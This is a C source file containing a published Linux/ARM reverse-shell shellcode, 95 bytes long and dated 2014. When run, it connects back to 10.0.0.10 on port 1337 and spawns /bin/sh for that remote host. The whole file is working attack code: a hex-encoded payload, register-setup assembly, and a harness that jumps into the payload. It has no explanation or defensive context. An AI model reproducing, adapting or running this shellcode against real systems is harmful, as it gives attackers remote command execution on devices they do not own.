/*
	Title	: Linux/ARM - Connect back to {ip:port} with /bin/sh
	Length	: 95 bytes
	Date	: 2014-06-03
	Author	: Xeon
	Tested	: ARM1176 rev6 (v6l)
*/

#include <stdio.h>
#include <string.h>

    char *shellcode = 	 "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x92\x1a\x90\x1a\x17\x27\x01\xdf"
			 "\x02\x20\x41\x1e\x82\x1e\x07\x02\xe7\x3f\x01\xdf\x05\x1c\x01\xac"
			 "\x02\x21\x21\x60\x02\x34\x05\x21\x21\x70\x01\x34\x39\x21\x21\x70"
			 "\x0a\x21\x02\x91\x04\x34\x21\x70\x01\xa9\x10\x22\x02\x37\x01\xdf"
			 "\xdc\x3f\x02\x21\x28\x1c\x01\xdf\x01\x39\xfb\xd5\x49\x1a\x92\x1a"
			 "\x0b\x27\x01\xa0\x01\xdf\xc0\x46\x2f\x62\x69\x6e\x2f\x73\x68"; /* 10.0.0.10:1337 */

int main()
{
__asm__ (   "eor r0, r0\n\t"
            "sub r0, #1\n\t"
            "mov r1, r0\n\t"
            "mov r2, r0\n\t"
            "mov r3, r0\n\t"
            "mov r4, r0\n\t"
            "mov r5, r0\n\t"
            "mov r6, r0\n\t"
            "mov r7, r0\n\t");

    printf("Shellcode length: %d\n", strlen(shellcode));
    printf("Running shellcode...\n");
    (*(void(*)()) shellcode)();
    printf("Failed!\n");
    return 0;
}